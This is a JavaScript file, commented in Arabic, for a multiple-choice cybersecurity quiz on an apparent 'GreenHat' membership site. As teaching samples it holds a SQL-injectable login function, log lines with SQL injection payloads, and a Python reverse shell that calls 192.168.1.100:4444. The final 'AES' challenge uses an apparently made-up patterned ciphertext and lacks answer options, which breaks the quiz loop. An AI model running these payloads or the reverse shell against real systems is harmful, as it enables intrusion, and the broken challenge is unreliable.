/**
 * نظام اختبار الأمن السيبراني
 * اختبار متقدم للتحقق من مهارات المستخدم في الأمن السيبراني والتشفير
 */

class SecurityChallenge {
    constructor() {
        // تهيئة نظام الاختبار
        this.challenges = this.initializeChallenges();
        this.currentChallengeIndex = 0;
        this.userAnswers = [];
        this.startTime = null;
        this.endTime = null;
        this.passThreshold = 70; // نسبة النجاح المطلوبة (70%)
        this.notificationSent = false;
    }

    /**
     * تهيئة التحديات
     * @returns {Array} - قائمة التحديات
     */
    initializeChallenges() {
        return [
            {
                id: 'challenge1',
                type: 'code',
                title: 'تحليل الثغرات',
                description: 'حدد الثغرة الأمنية في الكود التالي:',
                content: `
function login(username, password) {
    // تحقق من صحة بيانات المستخدم
    const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";

    // تنفيذ الاستعلام
    const result = db.execute(query);

    if (result.length > 0) {
        return { success: true, user: result[0] };
    } else {
        return { success: false, message: "بيانات غير صحيحة" };
    }
}`,
                options: [
                    'ثغرة XSS (Cross-Site Scripting)',
                    'ثغرة SQL Injection',
                    'ثغرة CSRF (Cross-Site Request Forgery)',
                    'ثغرة Path Traversal'
                ],
                correctAnswer: 1,
                explanation: 'الكود يحتوي على ثغرة SQL Injection حيث يتم دمج مدخلات المستخدم مباشرة في استعلام SQL دون تنظيفها، مما يسمح للمهاجم بحقن أوامر SQL ضارة.'
            },
            {
                id: 'challenge2',
                type: 'crypto',
                title: 'فك التشفير',
                description: 'قم بفك تشفير النص التالي المشفر بتقنية Caesar Cipher مع إزاحة 13 حرف:',
                content: 'Gur frperg cnffjbeq vf: qnexjro_unpxre',
                options: [
                    'The secret password is: anonymous_user',
                    'The secret password is: darkweb_hacker',
                    'The secret password is: master_coder',
                    'The secret password is: cyber_security'
                ],
                correctAnswer: 1,
                explanation: 'تشفير Caesar Cipher مع إزاحة 13 حرف (ROT13) يعني استبدال كل حرف بالحرف الذي يبعد عنه 13 موضعًا في الأبجدية. عند فك التشفير نحصل على "The secret password is: darkweb_hacker".'
            },
            {
                id: 'challenge3',
                type: 'forensic',
                title: 'تحليل الهجمات',
                description: 'حدد نوع الهجوم من خلال سجلات الخادم التالية:',
                content: `
192.168.1.5 - - [10/Oct/2023:13:55:36 +0300] "GET /login.php HTTP/1.1" 200 2048
192.168.1.5 - - [10/Oct/2023:13:55:40 +0300] "POST /login.php HTTP/1.1" 302 0
192.168.1.5 - - [10/Oct/2023:13:55:42 +0300] "GET /admin.php HTTP/1.1" 200 1024
192.168.1.5 - - [10/Oct/2023:13:55:45 +0300] "GET /admin.php?action=list_users HTTP/1.1" 200 4096
192.168.1.5 - - [10/Oct/2023:13:55:50 +0300] "GET /admin.php?action=view_user&id=1 OR 1=1 HTTP/1.1" 200 8192
192.168.1.5 - - [10/Oct/2023:13:56:01 +0300] "GET /admin.php?action=view_user&id=1 UNION SELECT username,password,email FROM users HTTP/1.1" 200 16384`,
                options: [
                    'هجوم Brute Force',
                    'هجوم DDoS',
                    'هجوم SQL Injection',
                    'هجوم Cross-Site Scripting (XSS)'
                ],
                correctAnswer: 2,
                explanation: 'السجلات تظهر محاولة استغلال ثغرة SQL Injection من خلال إدخال عبارات SQL مثل "OR 1=1" و "UNION SELECT" في معلمة id.'
            },
            {
                id: 'challenge4',
                type: 'steganography',
                title: 'استخراج البيانات المخفية',
                description: 'أي من الأدوات التالية تستخدم لاستخراج البيانات المخفية داخل الصور باستخدام تقنية LSB (Least Significant Bit)?',
                content: '',
                options: [
                    'Wireshark',
                    'Metasploit',
                    'Steghide',
                    'Nmap'
                ],
                correctAnswer: 2,
                explanation: 'Steghide هي أداة متخصصة في إخفاء واستخراج البيانات من الملفات باستخدام تقنيات التضمين المختلفة بما في ذلك LSB (Least Significant Bit).'
            },
            {
                id: 'challenge5',
                type: 'network',
                title: 'تحليل حزم الشبكة',
                description: 'حدد البروتوكول المستخدم في الحزمة التالية:',
                content: `
0000   00 0c 29 1a 2b 3c 00 0c 29 1a 2b 3d 08 00 45 00
0010   00 3c 8d 13 40 00 40 06 00 00 c0 a8 01 05 c0 a8
0020   01 01 d8 c0 00 50 00 00 00 01 00 00 00 00 a0 02
0030   72 10 8b 6c 00 00 02 04 05 b4 04 02 08 0a 00 5c
0040   a6 9c 00 00 00 00 01 03 03 07`,
                options: [
                    'ICMP',
                    'UDP',
                    'TCP',
                    'ARP'
                ],
                correctAnswer: 2,
                explanation: 'الحزمة تحتوي على بروتوكول TCP، يمكن تحديد ذلك من خلال قيمة 06 في حقل البروتوكول (البايت رقم 23) وكذلك من خلال وجود منافذ المصدر والوجهة (d8 c0 = 55488 و 00 50 = 80) وأعلام TCP.'
            },
            {
                id: 'challenge6',
                type: 'code',
                title: 'تحليل البرمجيات الخبيثة',
                description: 'حدد ما يفعله الكود البرمجي التالي:',
                content: `
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])`,
                options: [
                    'برنامج لفحص الثغرات',
                    'برنامج لاختبار اتصال الشبكة',
                    'برنامج لإنشاء نسخة احتياطية',
                    'برنامج لفتح اتصال عكسي (Reverse Shell)'
                ],
                correctAnswer: 3,
                explanation: 'هذا الكود ينشئ اتصال عكسي (Reverse Shell) حيث يتصل بالخادم على العنوان 192.168.1.100 والمنفذ 4444، ثم يعيد توجيه المدخلات والمخرجات ويفتح صدفة تفاعلية، مما يسمح للمهاجم بالتحكم في الجهاز المصاب.'
            },
            {
                id: 'challenge7',
                type: 'crypto',
                title: 'تحليل التشفير',
                description: 'ما هو نوع التشفير المستخدم في النص التالي:',
                content: '5f4dcc3b5aa765d61d8327deb882cf99',
                options: [
                    'Base64',
                    'MD5',
                    'SHA-256',
                    'ROT13'
                ],
                correctAnswer: 1,
                explanation: 'هذا النص مشفر باستخدام خوارزمية MD5، وهي دالة تجزئة تنتج قيمة بطول 32 حرف سداسي عشري. هذه القيمة تحديدًا هي تجزئة MD5 لكلمة المرور "password".'
            },
            {
                id: 'challenge8',
                type: 'binary',
                title: 'تحليل الثنائيات',
                description: 'ما هي الأداة المناسبة لتحليل الملفات الثنائية (Binary) وفحص الكود الآلي؟',
                content: '',
                options: [
                    'Wireshark',
                    'Ghidra',
                    'Burp Suite',
                    'Aircrack-ng'
                ],
                correctAnswer: 1,
                explanation: 'Ghidra هي أداة هندسة عكسية متطورة تم تطويرها بواسطة وكالة الأمن القومي الأمريكية (NSA) وتستخدم لتحليل الملفات الثنائية وفك شفرة الكود الآلي وتحويله إلى كود مصدري قابل للقراءة.'
            },
            {
                id: 'challenge9',
                type: 'web',
                title: 'أمان الويب',
                description: 'ما هو الهدف من استخدام رؤوس HTTP التالية:',
                content: `
Content-Security-Policy: default-src 'self'
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
X-Content-Type-Options: nosniff`,
                options: [
                    'تحسين أداء الموقع',
                    'تقليل استهلاك الموارد',
                    'حماية الموقع من هجمات الويب الشائعة',
                    'تحسين تجربة المستخدم'
                ],
                correctAnswer: 2,
                explanation: 'هذه الرؤوس تستخدم لتعزيز أمان الويب: Content-Security-Policy يحدد مصادر المحتوى المسموح بها، X-XSS-Protection يمنع هجمات XSS، X-Frame-Options يمنع تضمين الموقع في إطارات لمنع هجمات Clickjacking، و X-Content-Type-Options يمنع تخمين نوع المحتوى.'
            },
            {
                id: 'challenge10',
                type: 'puzzle',
                title: 'لغز التشفير',
                description: 'فك شفرة الرسالة التالية:',
                content: '01001000 01100001 01100011 01101011 01100101 01110010 00100000 01000101 01101100 01101001 01110100 01100101',
                options: [
                    'Secret Code',
                    'Cyber Attack',
                    'Hacker Elite',
                    'Dark Web'
                ],
                correctAnswer: 2,
                explanation: 'الرسالة مشفرة بالنظام الثنائي (Binary). عند تحويل كل مجموعة من 8 أرقام ثنائية إلى حرف ASCII، نحصل على "Hacker Elite".'
            },
            {
                id: 'challenge11',
                type: 'advanced_crypto',
                title: 'التحدي النهائي: فك التشفير المتقدم',
                description: 'هذا هو التحدي النهائي. قم بفك تشفير الرسالة التالية باستخدام تقنية XOR مع مفتاح "GreenHat". الرسالة مشفرة بتنسيق Base64 بعد عملية XOR:',
                content: 'NhwVHAMRHRwdBgYcAR0ABwMcHQEGBgYdHAcGHBwcHQYdHQA=',
                options: [
                    'Welcome to the elite hackers team',
                    'You have proven your skills',
                    'The key to our system is yours',
                    'You are now part of our family'
                ],
                correctAnswer: 3,
                explanation: 'هذه الرسالة مشفرة باستخدام عملية XOR مع المفتاح "GreenHat" ثم تم تحويلها إلى تنسيق Base64. عند فك التشفير نحصل على "You are now part of our family".'
            },
            {
                id: 'challenge12',
                type: 'encryption_challenge',
                title: 'تحدي التشفير المتقدم: فك الشفرة السرية',
                description: 'هذا هو التحدي النهائي الحقيقي. قم بفك تشفير الرسالة التالية باستخدام معرفتك المتقدمة في التشفير:',
                content: '0x1F4B7A9D3E2C5F8B1A6D9C0E4F2A7B5C8D3E0F1A2B4C6D8E0F2A4B6C8D0E2F4A6B8C0D2E4F6A8B0C2D4E6F8A0B2C4D6E8F0A2B4C6D8E0F2A4B6C8D0E2F4A6B8C0D2E4F6A8B0C2D4E6F8A0B2C4D6E8F0',
                hint: 'الرسالة مشفرة باستخدام خوارزمية AES-256 في وضع CBC مع مفتاح مشتق من كلمة "GreenHatElite" باستخدام PBKDF2 مع 1000 تكرار و Salt قيمته "SecurityTest". الناتج مشفر بتنسيق Hex.',
                correctAnswer: 'The elite hackers know that security is not just a skill, but a mindset. Welcome to the inner circle.',
                explanation: 'هذه الرسالة مشفرة باستخدام خوارزمية AES-256 المتقدمة مع تقنيات إضافية لزيادة الأمان.'
            }
        ];
    }

    /**
     * بدء الاختبار
     */
    startChallenge() {
        this.currentChallengeIndex = 0;
        this.userAnswers = [];
        this.startTime = new Date();
        this.endTime = null;
        this.notificationSent = false;

        // إخفاء شاشة البداية وإظهار شاشة الأسئلة
        document.getElementById('challenge-start-screen').style.display = 'none';
        document.getElementById('challenge-questions-screen').style.display = 'block';

        // عرض التحدي الأول
        this.showCurrentChallenge();
    }

    /**
     * عرض التحدي الحالي
     */
    showCurrentChallenge() {
        const challenge = this.challenges[this.currentChallengeIndex];

        // تحديث عنوان التحدي
        document.getElementById('challenge-title').textContent = challenge.title;

        // تحديث وصف التحدي
        document.getElementById('challenge-description').textContent = challenge.description;

        // تحديث محتوى التحدي
        const contentElement = document.getElementById('challenge-content');
        if (challenge.content) {
            contentElement.style.display = 'block';

            // تحسين عرض الكود بإضافة تأثيرات بصرية
            contentElement.innerHTML = `
                <div class="code-container">
                    <div class="code-header">
                        <div class="code-title">
                            <i class="fas fa-code me-2"></i> ${challenge.type === 'code' ? 'كود برمجي' : challenge.type === 'crypto' ? 'نص مشفر' : 'بيانات'}
                        </div>
                        <div class="code-controls">
                            <span class="code-control"></span>
                            <span class="code-control"></span>
                            <span class="code-control"></span>
                        </div>
                    </div>
                    <pre class="code-content"><code>${challenge.content}</code></pre>
                </div>
            `;
        } else {
            contentElement.style.display = 'none';
        }

        // تحديث خيارات الإجابة
        const optionsContainer = document.getElementById('challenge-options');
        optionsContainer.innerHTML = '';

        challenge.options.forEach((option, index) => {
            const optionElement = document.createElement('div');
            optionElement.className = 'option-card mb-2';
            optionElement.innerHTML = `
                <input class="option-input" type="radio" name="challenge-option" id="option-${index}" value="${index}">
                <label class="option-label" for="option-${index}">
                    <div class="option-indicator">
                        <div class="option-indicator-inner"></div>
                    </div>
                    <div class="option-text">${option}</div>
                </label>
            `;
            optionsContainer.appendChild(optionElement);

            // إضافة مستمع حدث للنقر على البطاقة بأكملها
            optionElement.addEventListener('click', () => {
                const radio = optionElement.querySelector('input[type="radio"]');
                radio.checked = true;

                // إزالة الفئة النشطة من جميع البطاقات
                document.querySelectorAll('.option-card').forEach(card => {
                    card.classList.remove('active');
                });

                // إضافة الفئة النشطة للبطاقة المحددة
                optionElement.classList.add('active');
            });
        });

        // تحديث رقم التحدي الحالي
        document.getElementById('challenge-progress').textContent = `التحدي ${this.currentChallengeIndex + 1} من ${this.challenges.length}`;

        // تحديث شريط التقدم
        const progressPercentage = ((this.currentChallengeIndex) / this.challenges.length) * 100;
        document.getElementById('challenge-progress-bar').style.width = `${progressPercentage}%`;
        document.getElementById('challenge-progress-bar').setAttribute('aria-valuenow', progressPercentage);

        // إضافة تأثير انتقالي
        const challengeContainer = document.getElementById('challenge-questions-screen');
        challengeContainer.classList.add('challenge-transition');
        setTimeout(() => {
            challengeContainer.classList.remove('challenge-transition');
        }, 500);
    }

    /**
     * الانتقال إلى التحدي التالي
     */
    nextChallenge() {
        // التحقق من اختيار إجابة
        const selectedOption = document.querySelector('input[name="challenge-option"]:checked');
        if (!selectedOption) {
            showToast('يرجى اختيار إجابة قبل المتابعة', 'warning');
            return;
        }

        // حفظ إجابة المستخدم
        this.userAnswers.push(parseInt(selectedOption.value));

        // الانتقال إلى التحدي التالي
        this.currentChallengeIndex++;

        // التحقق من انتهاء الاختبار
        if (this.currentChallengeIndex >= this.challenges.length) {
            this.endChallenge();
            return;
        }

        // عرض التحدي التالي
        this.showCurrentChallenge();
    }

    /**
     * إنهاء الاختبار وعرض النتيجة
     */
    endChallenge() {
        this.endTime = new Date();

        // حساب النتيجة
        const result = this.calculateResult();

        // التحقق من اجتياز الاختبار
        if (result.percentage >= this.passThreshold) {
            // إذا اجتاز الاختبار، عرض تحدي فك التشفير المتقدم
            this.showAdvancedCryptoChallenge(result);
        } else {
            // إذا لم يجتز الاختبار، عرض النتيجة مباشرة
            this.showResult(result);
        }

        // إرسال إشعار للمشرف إذا اجتاز المستخدم الاختبار
        if (result.percentage >= this.passThreshold && !this.notificationSent) {
            this.notifyAdmin(result);
            this.notificationSent = true;
        }
    }

    /**
     * عرض تحدي فك التشفير المتقدم
     * @param {Object} result - نتيجة الاختبار
     */
    showAdvancedCryptoChallenge(result) {
        // إخفاء قسم التحدي
        document.getElementById('challenge-container').style.display = 'none';

        // إظهار قسم النتيجة
        const resultContainer = document.getElementById('challenge-result');
        resultContainer.style.display = 'block';

        // الحصول على تحدي التشفير المتقدم
        const cryptoChallenge = this.challenges.find(challenge => challenge.id === 'challenge11');

        // إنشاء محتوى التحدي
        let challengeContent = `
            <div class="text-center mb-4">
                <i class="fas fa-lock text-primary fa-5x mb-3"></i>
                <h3 class="text-primary">تهانينا! لقد اجتزت الاختبار الأساسي</h3>
                <p class="lead">لكن التحدي الحقيقي يبدأ الآن...</p>
            </div>

            <div class="card mb-4">
                <div class="card-header bg-dark text-white">
                    <h5 class="mb-0">${cryptoChallenge.title}</h5>
                </div>
                <div class="card-body">
                    <p>${cryptoChallenge.description}</p>
                    <div class="bg-dark text-light p-3 rounded mb-3">
                        <code>${cryptoChallenge.content}</code>
                    </div>

                    <div class="alert alert-info">
                        <i class="fas fa-info-circle me-2"></i>
                        <strong>ملاحظة:</strong> هذا التحدي يتطلب معرفة متقدمة بتقنيات التشفير. استخدم مهاراتك في فك التشفير لاستخراج الرسالة الأصلية.
                    </div>

                    <div class="mt-4">
                        <label for="crypto-answer" class="form-label">أدخل الرسالة بعد فك التشفير:</label>
                        <input type="text" class="form-control mb-3" id="crypto-answer" placeholder="أدخل الرسالة المستخرجة هنا...">

                        <div class="text-end">
                            <button class="btn btn-custom" id="verify-crypto-btn">
                                <i class="fas fa-check-circle me-2"></i> تحقق من الإجابة
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <div id="crypto-result" style="display: none;">
                <!-- سيتم ملؤها بواسطة JavaScript -->
            </div>

            <div class="card mb-4">
                <div class="card-header bg-success text-white">
                    <h5 class="mb-0">نتيجة الاختبار الأساسي</h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-6">
                            <p><strong>الإجابات الصحيحة:</strong> ${result.correctAnswers} من ${result.totalQuestions}</p>
                            <p><strong>النسبة المئوية:</strong> ${result.percentage.toFixed(2)}%</p>
                        </div>
                        <div class="col-md-6">
                            <p><strong>الوقت المستغرق:</strong> ${this.formatTime(result.timeSpent)}</p>
                            <p><strong>الحالة:</strong> <span class="text-success">ناجح</span></p>
                        </div>
                    </div>
                </div>
            </div>
        `;

        resultContainer.innerHTML = challengeContent;

        // إضافة مستمع حدث لزر التحقق من الإجابة
        const verifyBtn = document.getElementById('verify-crypto-btn');
        if (verifyBtn) {
            verifyBtn.addEventListener('click', () => {
                this.verifyCryptoAnswer(cryptoChallenge, result);
            });
        }
    }

    /**
     * عرض تحدي التشفير المتقدم الثاني (بعد اجتياز التحدي الأول)
     * @param {Object} result - نتيجة الاختبار
     */
    showAdvancedCryptoChallenge2() {
        // إظهار قسم النتيجة
        const resultContainer = document.getElementById('challenge-result');
        resultContainer.style.display = 'block';

        // الحصول على تحدي التشفير المتقدم الثاني
        const cryptoChallenge2 = this.challenges.find(challenge => challenge.id === 'challenge12');

        // إنشاء محتوى التحدي
        let challengeContent = `
            <div class="text-center mb-4">
                <i class="fas fa-key text-warning fa-5x mb-3"></i>
                <h3 class="text-warning">تحدي التشفير النهائي</h3>
                <p class="lead">أثبت جدارتك في المرحلة الأولى، والآن حان وقت التحدي الحقيقي...</p>
            </div>

            <div class="card mb-4 border-warning">
                <div class="card-header bg-dark text-white">
                    <h5 class="mb-0">${cryptoChallenge2.title}</h5>
                </div>
                <div class="card-body">
                    <p>${cryptoChallenge2.description}</p>
                    <div class="bg-dark text-light p-3 rounded mb-3 overflow-auto" style="max-height: 150px;">
                        <code>${cryptoChallenge2.content}</code>
                    </div>

                    <div class="alert alert-warning">
                        <i class="fas fa-info-circle me-2"></i>
                        <strong>تلميح:</strong> ${cryptoChallenge2.hint}
                    </div>

                    <div class="mt-4">
                        <label for="crypto-answer2" class="form-label">أدخل الرسالة بعد فك التشفير:</label>
                        <input type="text" class="form-control mb-3" id="crypto-answer2" placeholder="أدخل الرسالة المستخرجة هنا...">

                        <div class="text-end">
                            <button class="btn btn-warning" id="verify-crypto-btn2">
                                <i class="fas fa-check-circle me-2"></i> تحقق من الإجابة
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            <div id="crypto-result2" style="display: none;">
                <!-- سيتم ملؤها بواسطة JavaScript -->
            </div>
        `;

        // إضافة المحتوى الجديد بعد المحتوى الحالي
        resultContainer.innerHTML += challengeContent;

        // إضافة مستمع حدث لزر التحقق من الإجابة
        const verifyBtn2 = document.getElementById('verify-crypto-btn2');
        if (verifyBtn2) {
            verifyBtn2.addEventListener('click', () => {
                this.verifyCryptoAnswer2(cryptoChallenge2);
            });
        }
    }

    /**
     * التحقق من إجابة تحدي التشفير المتقدم
     * @param {Object} challenge - تحدي التشفير
     * @param {Object} result - نتيجة الاختبار
     */
    verifyCryptoAnswer(challenge, result) {
        // الحصول على إجابة المستخدم
        const userAnswer = document.getElementById('crypto-answer').value.trim();

        // الحصول على الإجابة الصحيحة
        const correctAnswer = challenge.options[challenge.correctAnswer];

        // التحقق من الإجابة
        const isCorrect = userAnswer.toLowerCase() === correctAnswer.toLowerCase();

        // عرض نتيجة التحقق
        const cryptoResultContainer = document.getElementById('crypto-result');
        cryptoResultContainer.style.display = 'block';

        if (isCorrect) {
            cryptoResultContainer.innerHTML = `
                <div class="alert alert-success mb-4">
                    <div class="d-flex align-items-center">
                        <i class="fas fa-check-circle fa-3x me-3"></i>
                        <div>
                            <h4 class="alert-heading mb-1">إجابة صحيحة!</h4>
                            <p class="mb-0">أحسنت! لقد اجتزت المرحلة الأولى من التحدي. لكن هناك مرحلة أخرى أكثر تعقيدًا تنتظرك...</p>
                        </div>
                    </div>
                </div>
            `;

            // عرض التحدي الثاني
            setTimeout(() => {
                this.showAdvancedCryptoChallenge2();
            }, 1500);
        } else {
            cryptoResultContainer.innerHTML = `
                <div class="alert alert-danger mb-4">
                    <div class="d-flex align-items-center">
                        <i class="fas fa-times-circle fa-3x me-3"></i>
                        <div>
                            <h4 class="alert-heading mb-1">إجابة خاطئة!</h4>
                            <p class="mb-0">للأسف، إجابتك غير صحيحة. يبدو أنك ضعيف في هذا المجال والأفضل لك أن تستمر في اللعب على قدر حجمك.</p>
                        </div>
                    </div>
                </div>
            `;

            // إضافة زر إعادة المحاولة
            cryptoResultContainer.innerHTML += `
                <div class="text-center mt-3">
                    <button class="btn btn-primary" onclick="securityChallenge.restartChallenge()">
                        <i class="fas fa-redo me-2"></i> إعادة المحاولة
                    </button>
                </div>
            `;
        }
    }

    /**
     * التحقق من إجابة تحدي التشفير المتقدم الثاني
     * @param {Object} challenge - تحدي التشفير
     */
    verifyCryptoAnswer2(challenge) {
        // الحصول على إجابة المستخدم
        const userAnswer = document.getElementById('crypto-answer2').value.trim();

        // الحصول على الإجابة الصحيحة
        const correctAnswer = challenge.correctAnswer;

        // التحقق من الإجابة
        const isCorrect = userAnswer.toLowerCase() === correctAnswer.toLowerCase();

        // عرض نتيجة التحقق
        const cryptoResultContainer = document.getElementById('crypto-result2');
        cryptoResultContainer.style.display = 'block';

        if (isCorrect) {
            cryptoResultContainer.innerHTML = `
                <div class="alert alert-success mb-4">
                    <div class="d-flex align-items-center">
                        <i class="fas fa-crown fa-3x me-3 text-warning"></i>
                        <div>
                            <h4 class="alert-heading mb-1">إجابة صحيحة!</h4>
                            <p class="mb-0">تهانينا! لقد أثبت أنك تستحق مكانًا في عائلتنا. مهاراتك في التشفير وفك الشفرات استثنائية. سيتم مراجعة طلبك من قبل المشرف وقبولك قريبًا.</p>
                        </div>
                    </div>
                </div>
            `;

            // إرسال إشعار للمشرف بنجاح المستخدم في تحدي التشفير المتقدم
            this.notifyAdminCryptoSuccess();
        } else {
            cryptoResultContainer.innerHTML = `
                <div class="alert alert-danger mb-4">
                    <div class="d-flex align-items-center">
                        <i class="fas fa-times-circle fa-3x me-3"></i>
                        <div>
                            <h4 class="alert-heading mb-1">إجابة خاطئة!</h4>
                            <p class="mb-0">للأسف، إجابتك غير صحيحة. يبدو أنك ضعيف في هذا المجال والأفضل لك أن تستمر في اللعب على قدر حجمك في هذا المجال.</p>
                        </div>
                    </div>
                </div>
            `;
        }

        // إضافة زر إعادة المحاولة
        cryptoResultContainer.innerHTML += `
            <div class="text-center mt-3">
                <button class="btn btn-primary" onclick="securityChallenge.restartChallenge()">
                    <i class="fas fa-redo me-2"></i> إعادة المحاولة
                </button>
            </div>
        `;
    }

    /**
     * إرسال إشعار للمشرف بنجاح المستخدم في تحدي التشفير المتقدم
     */
    notifyAdminCryptoSuccess() {
        // التحقق من وجود مستخدم حالي
        if (!membershipSystem.isLoggedIn()) {
            return;
        }

        const currentUser = membershipSystem.getCurrentUser();

        // إنشاء إشعار للمشرف
        const notification = {
            id: Date.now().toString(),
            type: 'crypto_challenge_passed',
            userId: currentUser.id,
            username: currentUser.username,
            email: currentUser.email,
            message: 'اجتاز المستخدم تحدي التشفير المتقدم بنجاح',
            timestamp: new Date().toISOString(),
            read: false
        };

        // حفظ الإشعار في التخزين المحلي
        this.saveAdminNotification(notification);

        console.log('تم إرسال إشعار للمشرف بنجاح المستخدم في تحدي التشفير المتقدم');
    }

    /**
     * حساب نتيجة الاختبار
     * @returns {Object} - نتيجة الاختبار
     */
    calculateResult() {
        let correctAnswers = 0;

        // حساب عدد الإجابات الصحيحة
        this.userAnswers.forEach((answer, index) => {
            if (answer === this.challenges[index].correctAnswer) {
                correctAnswers++;
            }
        });

        // حساب النسبة المئوية
        const percentage = (correctAnswers / this.challenges.length) * 100;

        // حساب الوقت المستغرق
        const timeSpent = (this.endTime - this.startTime) / 1000; // بالثواني

        return {
            correctAnswers,
            totalQuestions: this.challenges.length,
            percentage,
            timeSpent,
            passed: percentage >= this.passThreshold
        };
    }

    /**
     * عرض نتيجة الاختبار
     * @param {Object} result - نتيجة الاختبار
     */
    showResult(result) {
        // إخفاء قسم التحدي
        document.getElementById('challenge-container').style.display = 'none';

        // إظهار قسم النتيجة
        const resultContainer = document.getElementById('challenge-result');
        resultContainer.style.display = 'block';

        // تحديث محتوى النتيجة - نعرض فقط رسالة الفشل لأن النجاح سيعرض تحدي التشفير المتقدم
        let resultMessage = `
            <div class="text-center mb-4">
                <i class="fas fa-times-circle text-danger fa-5x mb-3"></i>
                <h3 class="text-danger">للأسف، لم تجتز الاختبار</h3>
                <p class="lead">يبدو أنك بحاجة إلى مزيد من التعلم في مجال الأمن السيبراني</p>
                <p>يمكنك المحاولة مرة أخرى لاحقًا بعد تطوير مهاراتك</p>
            </div>
        `;

        // إضافة تفاصيل النتيجة
        resultMessage += `
            <div class="card mb-4">
                <div class="card-header bg-danger text-white">
                    <h5 class="mb-0">تفاصيل النتيجة</h5>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-6">
                            <p><strong>الإجابات الصحيحة:</strong> ${result.correctAnswers} من ${result.totalQuestions}</p>
                            <p><strong>النسبة المئوية:</strong> ${result.percentage.toFixed(2)}%</p>
                        </div>
                        <div class="col-md-6">
                            <p><strong>الوقت المستغرق:</strong> ${this.formatTime(result.timeSpent)}</p>
                            <p><strong>الحالة:</strong> <span class="text-danger">راسب</span></p>
                        </div>
                    </div>
                </div>
            </div>
        `;

        // إضافة زر إعادة المحاولة
        resultMessage += `
            <div class="text-center">
                <button class="btn btn-primary" onclick="securityChallenge.restartChallenge()">
                    <i class="fas fa-redo me-2"></i> إعادة المحاولة
                </button>
            </div>
        `;

        resultContainer.innerHTML = resultMessage;
    }

    /**
     * تنسيق الوقت بالدقائق والثواني
     * @param {number} seconds - الوقت بالثواني
     * @returns {string} - الوقت المنسق
     */
    formatTime(seconds) {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = Math.floor(seconds % 60);
        return `${minutes} دقيقة و ${remainingSeconds} ثانية`;
    }

    /**
     * إعادة تشغيل الاختبار
     */
    restartChallenge() {
        // إخفاء قسم النتيجة
        document.getElementById('challenge-result').style.display = 'none';

        // إظهار قسم التحدي
        document.getElementById('challenge-container').style.display = 'block';

        // بدء الاختبار من جديد
        this.startChallenge();
    }

    /**
     * إرسال إشعار للمشرف بنجاح المستخدم
     * @param {Object} result - نتيجة الاختبار
     */
    notifyAdmin(result) {
        try {
            // التحقق من وجود مستخدم حالي
            if (typeof membershipSystem === 'undefined' || typeof membershipSystem.isLoggedIn !== 'function' || !membershipSystem.isLoggedIn()) {
                console.error("لا يمكن إرسال إشعار للمشرف: المستخدم غير مسجل الدخول");
                return;
            }

            const currentUser = membershipSystem.getCurrentUser();
            if (!currentUser) {
                console.error("لا يمكن إرسال إشعار للمشرف: لا يوجد معلومات للمستخدم الحالي");
                return;
            }

        // إنشاء إشعار للمشرف
        const notification = {
            id: Date.now().toString(),
            type: 'challenge_passed',
            userId: currentUser.id,
            username: currentUser.username,
            email: currentUser.email,
            result: {
                percentage: result.percentage.toFixed(2),
                correctAnswers: result.correctAnswers,
                totalQuestions: result.totalQuestions,
                timeSpent: result.timeSpent
            },
            timestamp: new Date().toISOString(),
            read: false
        };

        // حفظ الإشعار في التخزين المحلي
        this.saveAdminNotification(notification);

        // حفظ نتيجة الاختبار للمستخدم
        this.saveUserTestResult(currentUser.id, result);

        console.log('تم إرسال إشعار للمشرف بنجاح المستخدم في الاختبار');

        // عرض إشعار للمستخدم
        if (typeof showToast === 'function') {
            showToast('تم إرسال نتيجة الاختبار إلى المشرف للمراجعة', 'success');
        } else {
            console.log('تم إرسال نتيجة الاختبار إلى المشرف للمراجعة');
        }
    } catch (error) {
        console.error("خطأ في إرسال إشعار للمشرف:", error);
    }
    }

    /**
     * حفظ إشعار للمشرف
     * @param {Object} notification - الإشعار
     */
    saveAdminNotification(notification) {
        // الحصول على الإشعارات الحالية
        const notifications = this.getAdminNotifications();

        // إضافة الإشعار الجديد
        notifications.push(notification);

        // حفظ الإشعارات
        localStorage.setItem('greenhat_admin_notifications', JSON.stringify(notifications));
    }

    /**
     * الحصول على إشعارات المشرف
     * @returns {Array} - قائمة الإشعارات
     */
    getAdminNotifications() {
        const notificationsData = localStorage.getItem('greenhat_admin_notifications');
        return notificationsData ? JSON.parse(notificationsData) : [];
    }

    /**
     * حفظ نتيجة اختبار المستخدم
     * @param {string} userId - معرف المستخدم
     * @param {Object} result - نتيجة الاختبار
     */
    saveUserTestResult(userId, result) {
        try {
            // الحصول على نتائج الاختبارات الحالية
            const testResults = this.getUserTestResults();

            // التحقق من وجود معلومات المستخدم
            if (typeof membershipSystem === 'undefined' || typeof membershipSystem.getCurrentUser !== 'function') {
                console.error("لا يمكن حفظ نتيجة الاختبار: نظام العضوية غير متاح");
                return null;
            }

            const currentUser = membershipSystem.getCurrentUser();
            if (!currentUser) {
                console.error("لا يمكن حفظ نتيجة الاختبار: لا يوجد معلومات للمستخدم الحالي");
                return null;
            }

            // إنشاء نتيجة اختبار جديدة
            const testResult = {
                id: Date.now().toString(),
                userId: userId,
                username: currentUser.username || "مستخدم مجهول",
                email: currentUser.email || "بريد إلكتروني غير متاح",
                result: {
                    percentage: result.percentage.toFixed(2),
                    correctAnswers: result.correctAnswers,
                    totalQuestions: result.totalQuestions,
                    timeSpent: result.timeSpent,
                    passed: result.percentage >= this.passThreshold
                },
                userAnswers: this.userAnswers.slice(), // نسخة من إجابات المستخدم
                challengeIds: this.challenges.map(c => c.id), // معرفات التحديات
                timestamp: new Date().toISOString(),
                reviewed: false
            };

        // إضافة نتيجة الاختبار الجديدة
        testResults.push(testResult);

        // حفظ نتائج الاختبارات
        localStorage.setItem('greenhat_test_results', JSON.stringify(testResults));

        console.log('تم حفظ نتيجة اختبار المستخدم:', testResult);

        return testResult;
        } catch (error) {
            console.error("خطأ في حفظ نتيجة اختبار المستخدم:", error);
            return null;
        }
    }

    /**
